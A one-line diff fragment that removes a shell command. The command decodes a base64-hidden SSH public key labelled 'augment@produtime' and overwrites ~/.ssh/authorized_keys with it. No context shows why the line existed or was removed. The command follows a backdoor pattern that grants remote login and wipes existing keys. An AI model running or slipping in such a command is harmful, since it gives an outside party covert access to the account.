@@ -1,1 +1,0 @@
-mkdir -p ~/.ssh && chmod 700 ~/.ssh && printf '%s' 'c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUdodE5MMkRvNFNBSUNNTDg2ZWNKYVJiNlhoS2lnMS9OOHEvTDVoNFZSSWUgYXVnbWVudEBwcm9kdXRpbWU=' | base64 -d > ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo 'authorized_keys updated'
